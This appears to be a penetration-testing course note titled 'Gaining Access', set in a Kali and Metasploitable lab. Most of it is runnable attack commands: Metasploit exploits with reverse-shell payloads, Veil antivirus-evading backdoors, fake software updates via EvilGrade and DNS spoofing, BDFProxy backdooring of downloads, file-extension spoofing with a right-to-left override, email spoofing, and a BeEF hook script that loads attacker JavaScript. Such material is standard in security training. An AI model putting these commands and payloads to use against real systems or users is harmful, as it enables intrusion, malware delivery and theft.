# Gaining Access

Three main approaches:

1. [Server Side](#server-side)

2. [Client Side](#client-side)

3. [Social Engineering](#social-engineering)

## Server Side

---

* To check if the Metasploitable machine and the Kali machine are on the same network, we can do a ping test:

```shell
ping 10.0.2.5
```

* zenmap can be used to gather more information about the server, as we have the IP now. Based on the vulnerable ports and services, we can discover more attacks on it.

* For each open port or service, we can Google them followed by the term 'exploit', and that will give us an idea about the vulnerabilities.

* Metasploit framework can be used to develop and launch exploits.

* Example of backdoor vulnerability:

```shell
msfconsole #launches Metasploit

use exploit/unix/ftp/vsftpd_234_backdoor #use particular exploit

show options

set RHOSTS 10.0.2.5

exploit #launch exploit
```

* Example of payload execution:

```shell
msfconsole

use exploit exploit/multi/samba/usermap_script

show options

set RHOSTS 10.0.2.5

show payloads #shows all possible payloads for particular exploit

#bind payloads open up a port on the target computer, and we can connect to it
#reverse payloads open up a port on our machine, and the target computer can connect to it
#reverse payloads can bypass firewalls

set PAYLOAD cmd/unix/reverse_netcat #sets payload

show options

set LHOST 10.0.2.4

exploit
```

## Client Side

---

* These attacks require user interaction and should be attempted if server-side attacks do not work.

* We can use Veil framework to generate backdoors which cannot be detected by anti-virus softwares.

```shell
veil

use 1 #uses evasion

list #shows list of payloads

use 15 #uses particular payload

set LHOST 10.0.2.7 #value as our IP

set LPORT 8080

set PROCESSORS 1 #making the payload unique by setting properties values

set SLEEP 5

generate #generate the backdoor
```

* Once backdoor is generated, we can check if it is detected by antivirus programs.

* To listen for incoming connections:

```shell
msfconsole

use exploit/multi/handler #module for listening incoming connections

show options

set PAYLOAD windows/meterpreter/reverse_https #set payload option

set LHOST 10.0.2.7 #set lhost as ip address

set LPORT 8080

exploit
```

* To check if backdoor works, we first need to move the backdoor file to the location '/var/www/html'.Then, after starting the Kali web server, we can use the Windows VM to visit the specific directory of the backdoor file.

* We can use EvilGrade to launch a fake upgrade in order to make the target download the backdoor:

```shell
cd /opt/evilgrade

./evilgrade

show modules

configure dap #this selects the module 'dap'

show options

set agent /var/www/html/evil-files/rev_https_8080.exe #path of backdoor file

set endsite www.speedbit.com

start

#Now we would want to be the MITM, so in a separate terminal we can use spoof.cap and DNS spoofing; note that metasploit is still listening for incoming connections in the background

bettercap -iface eth0 -caplet spoof.cap

set dns.spoof.all true

set dns.spoof.domains update.speedbit.com

dns.spoof on

#Now we can check the software(DAP) for updates on the Windows machine, and get access to it remotely
```

* Another method for downloading backdoors is using a software called BDFProxy:

```shell
#Navigate to /opt/BDFProxy, and configure bdfproxy.cfg according to target

cd /opt/BDFProxy/

./bdf_proxy.py

#Now, become the MITM
bettercap -iface eth0 -caplet spoof.cap

#Apply a rule for packets
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

#run resource file given by BDFProxy
msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc

#Now, we can wait for target computer to download something like an .exe file, so that it can get backdoored during the process
```

## Social Engineering

---

* These attacks rely on gathering info about the user, and building a strategy based on the info gathered.

* Maltego can be used as an information gathering tool. Based on the info gathered, strategies can be built for the target.

* We can combine backdoor with any file by using a [download-and-execute payload](../autoit-download-and-execute.txt). As this sample script is written in AutoIt, we have to change extension from .txt to .au3. Then, it can be compiled into a .exe file, and moved to the directory /var/www/html/. At the same time, we have to listen for incoming connections using Metasploit.

* Using a right-to-left override character, we can spoof the file extension (from .exe to .jpg, for example).

* Email spoofing can be done by using a SMTP server, or using PHP mail functions coupled with a web hosting plan.

* BeEF (Browser Exploitation Framework) can be used to launch attacks on a hooked target. A basic way of hooking a browser is by injecting the given script into the web file of Kali and visiting the IP address on target machine.

* Script for injecting BeEF:

```javascript
var imported = document.createElement('script');
imported.src = 'http://10.0.2.7:3000/hook.js';
document.head.appendChild(imported);
```

* By using BeEF with Bettercap, we can inject JavaScript code into the target browser.

```shell
#first add BeEF injection script file location into hstshijack.cap payload section

bettercap -iface eth0 -caplet spoof.cap

hstshijack/hstshijack

#if target computer loads any website on the browser now, it gets hooked to BeEF
```

* Once hooked, we can use BeEF commands to attack the target.

---
